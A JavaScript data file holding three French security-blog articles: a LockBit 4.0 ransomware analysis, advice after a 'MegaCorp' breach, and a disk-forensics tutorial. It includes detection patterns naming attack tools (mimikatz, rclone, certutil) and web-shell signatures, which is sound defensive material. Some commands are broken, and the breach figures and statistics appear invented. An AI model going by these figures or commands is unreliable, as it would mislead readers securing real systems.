// ===== ARTICLES ENRICHIS CYBERGUARD PRO =====
// Nouveaux articles: Actualit√©s cyber, tutoriels avanc√©s, √©tudes de cas

const enrichedBlogArticles = [
    // ========== ACTUALIT√âS CYBER R√âCENTES ==========
    {
        id: 101,
        category: "ACTUALIT√â",
        icon: "üö®",
        title: "LockBit 4.0 : Le ransomware qui menace les entreprises en 2025",
        excerpt: "Analyse compl√®te du nouveau variant LockBit 4.0, ses techniques d'attaque et comment s'en prot√©ger...",
        date: "2025-10-28",
        readTime: "12 min",
        author: "√âquipe CyberGuard",
        tags: ["Ransomware", "Menaces", "Entreprises"],
        featured: true,
        image: "üö®",
        content: `
# LockBit 4.0 : Le ransomware qui menace les entreprises en 2025

## üéØ R√©sum√© Ex√©cutif
LockBit 4.0 repr√©sente une √©volution majeure du ransomware le plus prolifique de 2024. Avec plus de 2000 victimes recens√©es et des demandes de ran√ßon d√©passant 100 millions de dollars, ce malware est devenu la menace #1 pour les entreprises.

## üìä Statistiques Alarmantes
- **2000+** entreprises touch√©es en 2024
- **$100M+** en ran√ßons demand√©es
- **72 heures** : d√©lai moyen avant publication des donn√©es
- **87%** : taux de chiffrement r√©ussi
- **23%** : victimes ayant pay√© la ran√ßon

## üîç Techniques d'Attaque

### 1. Vecteurs d'Infection
\`\`\`
Phase 1: Initial Access
‚îú‚îÄ‚îÄ Phishing cibl√© (spear-phishing)
‚îú‚îÄ‚îÄ Exploitation de VPN non patch√©s
‚îú‚îÄ‚îÄ Credentials vol√©s (infostealer)
‚îî‚îÄ‚îÄ RDP expos√©s avec mots de passe faibles

Phase 2: Lateral Movement
‚îú‚îÄ‚îÄ Mimikatz pour extraction credentials
‚îú‚îÄ‚îÄ PsExec pour ex√©cution √† distance
‚îú‚îÄ‚îÄ WMI pour propagation silencieuse
‚îî‚îÄ‚îÄ SMB pour transfert de fichiers

Phase 3: Data Exfiltration
‚îú‚îÄ‚îÄ Rclone vers cloud storage
‚îú‚îÄ‚îÄ Mega.nz uploads
‚îú‚îÄ‚îÄ Split archives pour contourner DLP
‚îî‚îÄ‚îÄ Chiffrement AES-256 des fichiers

Phase 4: Encryption
‚îú‚îÄ‚îÄ Arr√™t des services critiques
‚îú‚îÄ‚îÄ Suppression des shadow copies
‚îú‚îÄ‚îÄ Chiffrement multi-thread√© rapide
‚îî‚îÄ‚îÄ D√©p√¥t de la note de ran√ßon
\`\`\`

### 2. Nouvelles Capacit√©s de LockBit 4.0

**Anti-Analysis**:
- D√©tection de machines virtuelles
- Bypass des EDR/AV modernes
- Obfuscation de code polymorphe
- Self-deletion apr√®s ex√©cution

**Speed Optimization**:
- Chiffrement GPU-accelerated
- Multi-threading am√©lior√©
- Compression avant chiffrement
- Chiffrement partiel pour vitesse

**Data Exfiltration**:
- Exfiltration automatique avant chiffrement
- Upload vers infrastructures d√©centralis√©es
- Chiffrement des donn√©es exfiltr√©es
- Menace de double extorsion

## üõ°Ô∏è Strat√©gies de Protection

### Niveau 1 : Pr√©vention de Base
\`\`\`bash
# 1. Segmentation r√©seau
sudo iptables -A FORWARD -i eth0 -o eth1 -j DROP
sudo iptables -A FORWARD -i eth0 -o eth1 -m state --state ESTABLISHED,RELATED -j ACCEPT

# 2. D√©sactivation RDP si non n√©cessaire
sudo systemctl stop rdp
sudo systemctl disable rdp

# 3. Audit des ports ouverts
nmap -sS -sV localhost
netstat -tuln | grep LISTEN

# 4. Surveillance des processus suspects
ps aux | grep -E "(mimikatz|rclone|psexec)"
\`\`\`

### Niveau 2 : D√©tection Avanc√©e

**R√®gles YARA pour LockBit 4.0**:
\`\`\`yara
rule LockBit_4_0_Ransomware {
    meta:
        description = "D√©tecte LockBit 4.0"
        author = "CyberGuard Team"
        date = "2025-10-28"

    strings:
        $s1 = "LockBit" ascii wide
        $s2 = ".lockbit" ascii wide
        $s3 = "All your files are encrypted" ascii wide
        $mz = { 4D 5A }

    condition:
        $mz at 0 and 2 of ($s*)
}
\`\`\`

**PowerShell : Monitoring de fichiers**:
\`\`\`powershell
# Surveillance temps r√©el des extensions de ransomware
$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = "C:\\"
$watcher.Filter = "*.lockbit"
$watcher.IncludeSubdirectories = $true
$watcher.EnableRaisingEvents = $true

$action = {
    $path = $Event.SourceEventArgs.FullPath
    Write-Warning "‚ö†Ô∏è RANSOMWARE DETECTED: $path"
    # Isoler la machine du r√©seau
    Disable-NetAdapter -Name "*" -Confirm:$false
}

Register-ObjectEvent $watcher "Created" -Action $action
\`\`\`

### Niveau 3 : Response Plan

**Plan de R√©ponse √† Incident (IRP)**:

1. **D√©tection (T+0)**
   - Alertes EDR d√©clench√©es
   - Fichiers chiffr√©s d√©tect√©s
   - Note de ran√ßon trouv√©e

2. **Isolation (T+5min)**
   - D√©brancher du r√©seau (Ethernet + WiFi)
   - √âteindre TOUS les postes connect√©s
   - Isoler les sauvegardes

3. **√âvaluation (T+30min)**
   - Identifier le p√©rim√®tre d'infection
   - Cataloguer les syst√®mes touch√©s
   - V√©rifier l'int√©grit√© des backups

4. **Recovery (T+2h)**
   - Restaurer depuis sauvegardes offline
   - R√©initialiser tous les credentials
   - Patcher les vuln√©rabilit√©s exploit√©es

## üí∞ Faut-il Payer la Ran√ßon ?

### ‚õî Arguments CONTRE le paiement
- ‚úó Aucune garantie de r√©cup√©ration (34% n'obtiennent rien)
- ‚úó Finance le crime organis√©
- ‚úó Vous marque comme "payeur" pour futures attaques
- ‚úó Peut √™tre ill√©gal (sanctions internationales)
- ‚úó Les donn√©es peuvent √™tre vendues malgr√© le paiement

### ‚ö†Ô∏è Cas o√π le paiement est consid√©r√©
- Donn√©es critiques non sauvegard√©es
- Secteur m√©dical (vie en danger)
- Menace de publication de donn√©es sensibles
- Co√ªt de downtime > co√ªt de ran√ßon

### ‚úÖ Alternative Recommand√©e
1. Contacter les autorit√©s (ANSSI, FBI)
2. V√©rifier sur NoMoreRansom.org
3. Engager des experts forensics
4. Restaurer depuis backups
5. Renforcer la s√©curit√© post-incident

## üîß Outils de D√©cryptage

### Projets Open-Source
\`\`\`bash
# 1. No More Ransom - Base de donn√©es de d√©crypteurs
curl -O https://www.nomoreransom.org/decryptor.exe

# 2. Emsisoft Decryptor (pour anciennes versions)
wget https://www.emsisoft.com/ransomware-decryption-tools

# 3. Kaspersky RakhniDecryptor
wget https://support.kaspersky.com/viruses/disinfection/8547
\`\`\`

## üìã Checklist de R√©silience Anti-Ransomware

### Backups (R√®gle 3-2-1-1-0)
- [ ] **3** copies de vos donn√©es
- [ ] **2** supports diff√©rents (disque + cloud)
- [ ] **1** copie hors site (offsite)
- [ ] **1** copie offline/air-gapped
- [ ] **0** erreur dans les tests de restauration

### S√©curit√© Endpoint
- [ ] EDR/XDR d√©ploy√© sur tous les postes
- [ ] Patch management automatis√©
- [ ] Application whitelisting actif
- [ ] D√©sactivation de macros Office par d√©faut
- [ ] Principe du moindre privil√®ge appliqu√©

### R√©seau
- [ ] Segmentation des r√©seaux (VLAN)
- [ ] MFA sur tous les acc√®s distants
- [ ] VPN avec certificats (pas de passwords)
- [ ] Monitoring du trafic r√©seau (IDS/IPS)
- [ ] Blocage des IPs malveillantes (threat feeds)

### Humain
- [ ] Formation phishing trimestrielle
- [ ] Simulations d'attaque r√©guli√®res
- [ ] Plan de r√©ponse √† incident test√©
- [ ] Contact avec CERT/CSIRT √©tabli
- [ ] Assurance cyber souscrite

## üåê Ressources Compl√©mentaires

**Outils Gratuits**:
- [CISA Ransomware Guide](https://www.cisa.gov/ransomware)
- [ANSSI Kit Ran√ßongiciel](https://www.ssi.gouv.fr)
- [Cybermalveillance.gouv.fr](https://www.cybermalveillance.gouv.fr)

**Threat Intelligence**:
- [LockBit Leak Site (TOR)](http://lockbit...onion) ‚ö†Ô∏è
- [Ransomware.live](https://ransomware.live)
- [ID-Ransomware](https://id-ransomware.malwarehunterteam.com)

## üéì Conclusion

LockBit 4.0 n'est pas invincible. Avec une strat√©gie de d√©fense en profondeur (defense-in-depth), des backups solides et une √©quipe form√©e, vous pouvez r√©sister √† cette menace.

**R√®gle d'or**: La meilleure d√©fense est de ne jamais √™tre infect√©. La seconde meilleure d√©fense est de pouvoir restaurer sans payer.

---
*Mise √† jour: 28 octobre 2025 | Niveau de menace: CRITIQUE*
        `
    },

    {
        id: 102,
        category: "ACTUALIT√â",
        icon: "üíî",
        title: "Data Breach 2025: 2 milliards de comptes compromis chez MegaCorp",
        excerpt: "Analyse technique du plus grand vol de donn√©es de l'ann√©e et ce que vous devez faire maintenant...",
        date: "2025-10-25",
        readTime: "10 min",
        author: "√âquipe CyberGuard",
        tags: ["Data Breach", "Fuite de donn√©es", "Protection"],
        featured: true,
        image: "üíî",
        content: `
# Data Breach 2025: 2 milliards de comptes compromis

## üî• L'Incident en Chiffres

- **2 000 000 000** comptes expos√©s
- **450 Go** de donn√©es vol√©es
- **$847M** : co√ªt estim√© pour l'entreprise
- **3 ans** : dur√©e de l'attaque non d√©tect√©e
- **Vendeur**: "USDoD" sur BreachForums

## üì¶ Donn√©es Compromises

### Informations Expos√©es
\`\`\`json
{
  "personal_data": {
    "names": "2 milliards",
    "emails": "2 milliards",
    "passwords": "1.8 milliards (hashed)",
    "phone_numbers": "1.5 milliards",
    "addresses": "900 millions",
    "dates_of_birth": "800 millions"
  },
  "sensitive_data": {
    "credit_cards": "12 millions (partielles)",
    "ssn": "45 millions (US uniquement)",
    "passport_numbers": "2 millions",
    "medical_records": "500 000"
  }
}
\`\`\`

## üîç Timeline de l'Attaque

\`\`\`
2022-03-15: Initial compromise via vuln√©rabilit√© Apache Struts
2022-04-20: Lateral movement vers bases de donn√©es
2022-06-10: Installation de backdoor persistant
2022-12-01: D√©but exfiltration des donn√©es (slow & low)
2025-10-20: Breach annonc√© publiquement
2025-10-21: Donn√©es en vente sur dark web ($50,000)
\`\`\`

## üõ°Ô∏è Que Faire MAINTENANT ?

### ‚úÖ Actions Imm√©diates (Aujourd'hui)

1. **V√©rifier si vous √™tes concern√©**
\`\`\`bash
# V√©rifier sur Have I Been Pwned
curl "https://haveibeenpwned.com/api/v3/breachedaccount/your@email.com" \\
  -H "hibp-api-key: YOUR_API_KEY"

# V√©rifier sur Firefox Monitor
# https://monitor.firefox.com
\`\`\`

2. **Changer TOUS vos mots de passe**
\`\`\`python
# G√©n√©rateur de mot de passe s√©curis√©
import secrets
import string

def generate_secure_password(length=20):
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(secrets.choice(alphabet) for i in range(length))
    return password

# G√©n√©rer 10 mots de passe uniques
for i in range(10):
    print(f"Password {i+1}: {generate_secure_password()}")
\`\`\`

3. **Activer la 2FA PARTOUT**
\`\`\`
Sites prioritaires:
‚úì Email principal
‚úì Banque en ligne
‚úì R√©seaux sociaux
‚úì Cloud storage (Google Drive, Dropbox)
‚úì Gestionnaire de mots de passe
‚úì Crypto exchanges
\`\`\`

### üìû Actions Cette Semaine

4. **Surveillance du cr√©dit**
   - Activer les alertes fraude dans votre banque
   - S'inscrire √† un service de monitoring (ex: Credit Karma)
   - Geler votre dossier de cr√©dit si possible

5. **S√©curiser vos comptes critiques**
\`\`\`bash
# Email : V√©rifier les r√®gles de transfert suspectes
# Gmail: Settings ‚Üí Forwarding ‚Üí V√©rifier
# Outlook: Settings ‚Üí Mail ‚Üí Forwarding ‚Üí V√©rifier

# R√©voquer les sessions actives
# Google: https://myaccount.google.com/device-activity
# Microsoft: https://account.microsoft.com/devices
\`\`\`

## üîê Protection Long Terme

### Strat√©gie de Mots de Passe

**‚ùå MAUVAIS**:
\`\`\`
Password123!
MonNom2025
MarqueVoiture!
\`\`\`

**‚úÖ BON (Passphrase)**:
\`\`\`
Correct-Horse-Battery-Staple-92!
Bleu.Girafe.Danse.Lune.47
Cafe#Montagne#Livre#Ocean#83
\`\`\`

**‚úÖ EXCELLENT (Gestionnaire de mdp)**:
\`\`\`
xK9#mP2$vL8@qR4&nT7!wY3%zB6
\`\`\`

### Authentification Multi-Facteurs (MFA)

**Classement par s√©curit√©**:
\`\`\`
ü•á FIDO2 Hardware Key (YubiKey) ......... 99% s√©curit√©
ü•à Authenticator App (Authy, Google) .... 95% s√©curit√©
ü•â SMS (codes texte) .................... 70% s√©curit√©
‚õî Email (codes par email) ............... 50% s√©curit√©
\`\`\`

## üïµÔ∏è Dark Web Monitoring

### Services Gratuits
\`\`\`
‚Ä¢ Have I Been Pwned - https://haveibeenpwned.com
‚Ä¢ Firefox Monitor - https://monitor.firefox.com
‚Ä¢ Google Password Checkup - int√©gr√© dans Chrome
‚Ä¢ Bitwarden Data Breach Report - dans l'app
\`\`\`

### Services Premium
\`\`\`
‚Ä¢ Experian Dark Web Scan - $9.99/mois
‚Ä¢ Norton LifeLock - $11.99/mois
‚Ä¢ Identity Guard - $8.99/mois
‚Ä¢ Aura - $12/mois (inclus VPN)
\`\`\`

## üö® Signes d'Identit√© Compromise

### Alertes Niveau 1 (Surveillance)
- [ ] Emails de r√©initialisation de mot de passe non sollicit√©s
- [ ] Tentatives de connexion depuis localisations √©trang√®res
- [ ] Nouveaux appareils connect√©s √† vos comptes

### Alertes Niveau 2 (Action Imm√©diate)
- [ ] Transactions bancaires non autoris√©es
- [ ] Nouveaux comptes ouverts √† votre nom
- [ ] Demandes de cr√©dit refus√©es inexpliqu√©es
- [ ] Factures pour services non souscrits

### Alertes Niveau 3 (Urgence)
- [ ] Visite de collecteurs de dettes
- [ ] Notification d'avis d'imposition incorrect
- [ ] Contact de forces de l'ordre pour fraude
- [ ] Dossiers m√©dicaux compromis

## üìä Statistiques Post-Breach

### Impact sur les Victimes
\`\`\`
87% ont chang√© leurs mots de passe
54% ont activ√© la 2FA
32% ont souscrit √† un service de monitoring
12% ont √©t√© victimes de fraude dans l'ann√©e suivante
5% ont eu leur identit√© usurp√©e
\`\`\`

### Co√ªts Moyens
\`\`\`
Temps perdu par victime:     8 heures
Co√ªt moyen de r√©solution:    $1,400
Stress psychologique:        √âlev√© (82% des victimes)
Perte de confiance:          73% moins confiance en ligne
\`\`\`

## üõ†Ô∏è Outils de R√©cup√©ration

### Script de V√©rification Automatique
\`\`\`python
#!/usr/bin/env python3
# check_breach.py - V√©rifie si vos emails sont compromis

import requests
import sys

def check_pwned(email):
    url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
    headers = {"hibp-api-key": "YOUR_API_KEY"}

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        breaches = response.json()
        print(f"‚ö†Ô∏è  {email} trouv√© dans {len(breaches)} breaches:")
        for breach in breaches:
            print(f"  ‚Ä¢ {breach['Name']} ({breach['BreachDate']})")
    elif response.status_code == 404:
        print(f"‚úÖ {email} n'appara√Æt dans aucun breach connu")
    else:
        print(f"‚ùå Erreur API: {response.status_code}")

if __name__ == "__main__":
    emails = [
        "your@email.com",
        "work@company.com",
        "old@email.com"
    ]

    for email in emails:
        check_pwned(email)
        print()
\`\`\`

## üìö Ressources L√©gales

### France
- **CNIL**: D√©p√¥t de plainte pour violation RGPD
- **Cybermalveillance.gouv.fr**: Assistance technique
- **Police nationale**: Plateforme PHAROS

### USA
- **FTC**: IdentityTheft.gov
- **FBI IC3**: ic3.gov
- **State Attorney General**: Consumer Protection

### Europe
- **Europol EC3**: European Cybercrime Centre
- **ENISA**: European Union Agency for Cybersecurity

## ‚úÖ Checklist de S√©curisation Post-Breach

### Semaine 1
- [ ] V√©rifier si je suis dans le breach
- [ ] Changer tous les mots de passe (utiliser gestionnaire)
- [ ] Activer 2FA sur tous les comptes importants
- [ ] V√©rifier les activit√©s suspectes sur comptes bancaires
- [ ] Alerter ma banque de la situation

### Mois 1
- [ ] Geler mon dossier de cr√©dit
- [ ] S'inscrire √† un service de surveillance
- [ ] Mettre √† jour les questions de s√©curit√©
- [ ] V√©rifier les sessions actives sur tous les comptes
- [ ] R√©voquer les autorisations d'applications tierces

### Ann√©e 1
- [ ] Surveillance mensuelle des comptes bancaires
- [ ] V√©rification trimestrielle du rapport de cr√©dit
- [ ] Renouvellement annuel des mots de passe critiques
- [ ] Formation continue sur les menaces √©mergentes
- [ ] Backup r√©gulier des donn√©es importantes

## üéØ Conclusion

Ce breach est un rappel brutal : **vous √™tes responsable de votre cybers√©curit√©**.

Les entreprises peuvent (et vont) se faire hacker. C'est VOTRE responsabilit√© de :
1. Utiliser des mots de passe uniques partout
2. Activer la 2FA syst√©matiquement
3. Surveiller vos comptes r√©guli√®rement
4. √ätre vigilant face au phishing
5. Utiliser un gestionnaire de mots de passe

**Agissez maintenant, pas apr√®s le prochain breach.**

---
*Derni√®re mise √† jour: 25 octobre 2025*
*Niveau de gravit√©: CRITIQUE*
        `
    },

    // ========== TUTORIELS AVANC√âS ==========
    {
        id: 103,
        category: "GUIDE",
        icon: "üî¨",
        title: "Digital Forensics: Analyser un Disque Compromis avec Autopsy",
        excerpt: "Guide complet pour mener une investigation forensique professionnelle sur un syst√®me compromis...",
        date: "2025-10-27",
        readTime: "25 min",
        author: "√âquipe CyberGuard",
        tags: ["Forensics", "Investigation", "Tutoriel avanc√©"],
        featured: true,
        image: "üî¨",
        content: `
# Digital Forensics: Analyser un Disque Compromis avec Autopsy

## üéØ Objectif du Tutoriel

Vous apprendrez √†:
- Cr√©er une image forensique d'un disque
- Analyser les artefacts syst√®me (Registry, Event Logs, Browser History)
- Reconstruire la timeline d'une attaque
- Identifier les IOC (Indicators of Compromise)
- Produire un rapport forensique professionnel

**Niveau**: Avanc√©
**Dur√©e**: 3-4 heures
**Outils**: Autopsy, FTK Imager, Volatility

## üìã Pr√©requis

### Mat√©riel N√©cessaire
\`\`\`
‚Ä¢ PC Linux (Ubuntu 22.04+) ou Windows 10/11
‚Ä¢ 16 GB RAM minimum (32 GB recommand√©)
‚Ä¢ 500 GB espace disque libre
‚Ä¢ Write-blocker USB (pour forensics r√©el)
‚Ä¢ Cl√© USB bootable avec CAINE Linux
\`\`\`

### Logiciels √† Installer
\`\`\`bash
# Ubuntu/Debian
sudo apt update
sudo apt install -y autopsy sleuthkit foremost volatility3

# T√©l√©charger FTK Imager
wget https://accessdata.com/product-download/ftk-imager-version-4.5.0

# T√©l√©charger Autopsy
wget https://github.com/sleuthkit/autopsy/releases/download/autopsy-4.20.0/autopsy-4.20.0.zip
\`\`\`

## üîç Phase 1: Acquisition Forensique

### √âtape 1.1: Cr√©er une Image Disque

**R√®gle d'or**: JAMAIS travailler sur le disque original !

\`\`\`bash
# Utiliser dd pour cr√©er une image bit-√†-bit
sudo dd if=/dev/sdb of=/forensics/evidence.img bs=4M status=progress

# Calcul du hash MD5/SHA256 pour int√©grit√©
md5sum /forensics/evidence.img > evidence.img.md5
sha256sum /forensics/evidence.img > evidence.img.sha256

# Cr√©er une image E01 (format forensique standard)
sudo ewfacquire /dev/sdb -t /forensics/evidence
\`\`\`

**Options FTK Imager (GUI)**:
\`\`\`
1. File ‚Üí Create Disk Image
2. Select Source: Physical Drive
3. Add Destination: E01 format
4. Fill in Case Information
5. Fragment size: 2000 MB
6. Compression: Best
7. Verify after creation: YES
\`\`\`

### √âtape 1.2: Chain of Custody

**Document CRITIQUE** pour validit√© l√©gale:

\`\`\`markdown
## CHAIN OF CUSTODY FORM

Case #: 2025-CYBER-001
Date: 2025-10-27
Investigator: Jean Dupont

### Evidence Details
- Item #: 001
- Description: Samsung SSD 1TB (Serial: S4XXXX)
- Hash MD5: a1b2c3d4e5f6...
- Hash SHA256: 9f8e7d6c5b4a...

### Transfer Log
| Date       | From       | To         | Purpose            | Signature |
|------------|------------|------------|--------------------|-----------|
| 2025-10-27 | Police     | Lab        | Forensic Analysis  | JD        |

### Storage Conditions
- Location: Evidence Locker #12
- Temperature: 20¬∞C
- Humidity: 45%
- Access Log: Maintained
\`\`\`

## üïµÔ∏è Phase 2: Analyse avec Autopsy

### √âtape 2.1: Cr√©ation du Cas

\`\`\`bash
# Lancer Autopsy
autopsy

# Interface web: http://localhost:9999/autopsy
\`\`\`

**Configuration du cas**:
\`\`\`
Case Name: MegaCorp_Breach_2025
Case Directory: /forensics/cases/megacorp/
Investigator: Jean Dupont
Case Number: 2025-CYBER-001
Evidence Type: Disk Image
Time Zone: Europe/Paris
\`\`\`

### √âtape 2.2: Modules d'Analyse

**Modules √† activer** (cochez tous):
\`\`\`
‚òë Recent Activity - Activit√© navigateur/fichiers
‚òë Hash Lookup - D√©tection de malwares connus
‚òë File Type Identification - Identification par signature
‚òë Extension Mismatch Detector - Fichiers suspects
‚òë Embedded File Extractor - Archives et conteneurs
‚òë Email Parser - Emails et pi√®ces jointes
‚òë Encryption Detection - Fichiers chiffr√©s
‚òë Interesting Files Identifier - Fichiers sensibles
‚òë PhotoRec Carver - R√©cup√©ration de fichiers supprim√©s
‚òë Keyword Search - Recherche de mots-cl√©s IOC
\`\`\`

### √âtape 2.3: Analyse des Artefacts

#### üîπ Registry Analysis

**Cl√©s Registry Critiques**:
\`\`\`
SYST√àME
HKLM\\SYSTEM\\CurrentControlSet\\Services - Services install√©s
HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run - Autostart
HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList - Users

UTILISATEUR
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run - Autostart user
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs - Fichiers r√©cents
HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU - Historique Open/Save
\`\`\`

**Recherche de Persistence**:
\`\`\`bash
# Extraire les Run keys
regedit.exe /e C:\\forensics\\run_keys.reg "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

# Analyser avec RegRipper
rip.pl -r SYSTEM -p services

# Chercher des valeurs suspectes
grep -i "powershell\|cmd\|wscript\|rundll32" run_keys.reg
\`\`\`

#### üîπ Event Logs Analysis

**Logs Windows Critiques**:
\`\`\`
Security.evtx - Authentications, privil√®ges
System.evtx - Services, drivers, erreurs syst√®me
Application.evtx - Applications tierces
Microsoft-Windows-Sysmon/Operational.evtx - Monitoring d√©taill√©
Microsoft-Windows-PowerShell/Operational.evtx - Scripts PowerShell
\`\`\`

**√âv√©nements Suspects**:
\`\`\`powershell
# Event ID 4624 - Successful Logon (Type 3 = Network, Type 10 = RDP)
Get-WinEvent -Path Security.evtx | Where-Object {$_.Id -eq 4624}

# Event ID 4672 - Special Privileges Assigned (Admin escalation)
Get-WinEvent -Path Security.evtx | Where-Object {$_.Id -eq 4672}

# Event ID 4688 - Process Creation
Get-WinEvent -Path Security.evtx | Where-Object {$_.Id -eq 4688}

# Event ID 4698 - Scheduled Task Created
Get-WinEvent -Path Security.evtx | Where-Object {$_.Id -eq 4698}

# Event ID 7045 - Service Installation
Get-WinEvent -Path System.evtx | Where-Object {$_.Id -eq 7045}
\`\`\`

**Parsing avec Python**:
\`\`\`python
import Evtx.Evtx as evtx

def parse_security_log(evtx_file):
    with evtx.Evtx(evtx_file) as log:
        for record in log.records():
            if record.event_id() == 4624:  # Successful logon
                xml = record.xml()
                # Parse et analyse
                print(f"Logon at {record.timestamp()}")

parse_security_log("/forensics/Security.evtx")
\`\`\`

#### üîπ Browser Forensics

**Artefacts Chrome/Edge**:
\`\`\`
%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\
‚îú‚îÄ‚îÄ History - URLs visit√©es
‚îú‚îÄ‚îÄ Cookies - Cookies stock√©s
‚îú‚îÄ‚îÄ Login Data - Mots de passe sauvegard√©s (chiffr√©s)
‚îú‚îÄ‚îÄ Web Data - Formulaires autocomplete
‚îî‚îÄ‚îÄ Cache - Fichiers en cache
\`\`\`

**Extraction avec Python**:
\`\`\`python
import sqlite3
import json
from datetime import datetime, timedelta

def chrome_time_to_datetime(chrome_time):
    # Chrome stocke les timestamps en microsecondes depuis 1601
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)

def extract_history(db_path):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    cursor.execute("""
        SELECT url, title, visit_count, last_visit_time
        FROM urls
        ORDER BY last_visit_time DESC
        LIMIT 100
    """)

    for row in cursor.fetchall():
        url, title, visits, timestamp = row
        dt = chrome_time_to_datetime(timestamp)
        print(f"[{dt}] {title} - {url} (visites: {visits})")

    conn.close()

extract_history("/forensics/Chrome/History")
\`\`\`

#### üîπ Timeline Analysis

**Super Timeline avec log2timeline**:
\`\`\`bash
# Cr√©er une super timeline (ATTENTION: tr√®s long)
log2timeline.py --storage-file /forensics/timeline.plaso /forensics/evidence.img

# Filtrer et exporter en CSV
psort.py -o l2tcsv -w /forensics/timeline.csv /forensics/timeline.plaso

# Filtrer par date
psort.py -o l2tcsv -w /forensics/filtered.csv /forensics/timeline.plaso "date > '2025-10-20 00:00:00' AND date < '2025-10-22 00:00:00'"
\`\`\`

**Analyse de la Timeline**:
\`\`\`python
import pandas as pd

# Charger la timeline
df = pd.read_csv("/forensics/timeline.csv")

# Rechercher des patterns suspects
suspicious_patterns = [
    "powershell",
    "cmd.exe /c",
    "rundll32",
    "certutil",
    "bitsadmin",
    "wmic",
    "net user",
    "mimikatz"
]

for pattern in suspicious_patterns:
    matches = df[df['message'].str.contains(pattern, case=False, na=False)]
    if not matches.empty:
        print(f"\\nüö® Trouv√© {len(matches)} occurrences de '{pattern}':")
        print(matches[['date', 'message']].head())
\`\`\`

## üß© Phase 3: Identification des IOC

### √âtape 3.1: Recherche de Fichiers Malveillants

**Hash lookup avec VirusTotal**:
\`\`\`python
import requests
import hashlib

VT_API_KEY = "YOUR_API_KEY"

def calculate_sha256(file_path):
    sha256 = hashlib.sha256()
    with open(file_path, 'rb') as f:
        for block in iter(lambda: f.read(4096), b""):
            sha256.update(block)
    return sha256.hexdigest()

def check_virustotal(file_hash):
    url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
    headers = {"x-apikey": VT_API_KEY}

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        data = response.json()
        stats = data['data']['attributes']['last_analysis_stats']
        print(f"Malicious: {stats['malicious']}/70 engines")
        return stats['malicious'] > 0
    return False

# V√©rifier un fichier suspect
file_hash = calculate_sha256("/forensics/suspicious.exe")
if check_virustotal(file_hash):
    print("‚ö†Ô∏è MALWARE D√âTECT√â!")
\`\`\`

### √âtape 3.2: Recherche de Backdoors

**Scan des connexions r√©seau**:
\`\`\`powershell
# Analyser les connexions √©tablies (live system)
netstat -anob | Select-String "ESTABLISHED"

# V√©rifier les services √©coutant
netstat -an | Select-String "LISTENING"

# Parsing du fichier HOSTS
Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts | Select-String -NotMatch "^#"
\`\`\`

**Recherche de Web Shells**:
\`\`\`bash
# Rechercher des patterns de web shells
grep -r "eval(base64_decode" /var/www/html/
grep -r "system(\$_GET" /var/www/html/
grep -r "exec(\$_POST" /var/www/html/

# Fichiers PHP r√©cemment modifi√©s
find /var/www/html/ -name "*.php" -mtime -7 -ls
\`\`\`

## üìä Phase 4: Rapport Forensique

### Structure du Rapport

\`\`\`markdown
# RAPPORT D'ANALYSE FORENSIQUE

## 1. INFORMATIONS G√âN√âRALES
- **Cas #**: 2025-CYBER-001
- **Date de l'incident**: 20 octobre 2025
- **Date de l'analyse**: 27 octobre 2025
- **Analyste**: Jean Dupont, GCFE

## 2. R√âSUM√â EX√âCUTIF
[2-3 paragraphes d√©crivant l'incident et les conclusions]

## 3. TIMELINE DE L'ATTAQUE

| Timestamp           | √âv√©nement                           | Source          | IOC           |
|---------------------|-------------------------------------|-----------------|---------------|
| 2025-10-20 08:34:12 | Initial compromise (phishing email) | Outlook PST     | malicious.doc |
| 2025-10-20 08:35:45 | Macro execution (PowerShell)        | Event ID 4104   | obfuscated.ps1|
| 2025-10-20 08:40:22 | C2 beacon established               | NetFlow         | 192.0.2.100   |
| 2025-10-20 09:15:33 | Lateral movement (PsExec)           | Event ID 5145   | psexec.exe    |
| 2025-10-20 10:30:00 | Data exfiltration started           | Firewall logs   | mega.nz       |

## 4. INDICATORS OF COMPROMISE (IOC)

### Fichiers Malveillants
\`\`\`
SHA256: a1b2c3d4e5f6...
Filename: invoice.doc.exe
Path: C:\\Users\\john\\Downloads\\
Detection: 45/70 AV engines
\`\`\`

### Adresses IP C2
\`\`\`
192.0.2.100:443 (Cloudflare CDN)
203.0.113.50:8080 (Direct connection)
\`\`\`

### Registry Keys Modifi√©s
\`\`\`
HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate
HKCU\\Software\\Classes\\mscfile\\shell\\open\\command
\`\`\`

## 5. M√âTHODOLOGIE D'ATTAQUE

### Kill Chain Analysis
1. **Reconnaissance**: Phishing cibl√© via LinkedIn
2. **Weaponization**: Macro Office malveillante
3. **Delivery**: Email avec pi√®ce jointe
4. **Exploitation**: CVE-2023-XXXX (Office RCE)
5. **Installation**: Backdoor persistant
6. **C2**: Communication HTTPS chiffr√©e
7. **Actions on Objectives**: Exfiltration de donn√©es

## 6. RECOMMANDATIONS

### Court terme (0-7 jours)
- [ ] Isoler les machines compromises
- [ ] R√©voquer les credentials expos√©s
- [ ] Bloquer les IOC au firewall
- [ ] D√©ployer les signatures IDS

### Moyen terme (1-3 mois)
- [ ] Renforcer la configuration Office
- [ ] D√©ployer EDR sur tous les endpoints
- [ ] Formation phishing pour tous les employ√©s
- [ ] Audit de s√©curit√© complet

### Long terme (3-12 mois)
- [ ] Programme de Threat Intelligence
- [ ] √âquipe SOC d√©di√©e
- [ ] Tests d'intrusion trimestriels
- [ ] Conformit√© ISO 27001

## 7. ANNEXES
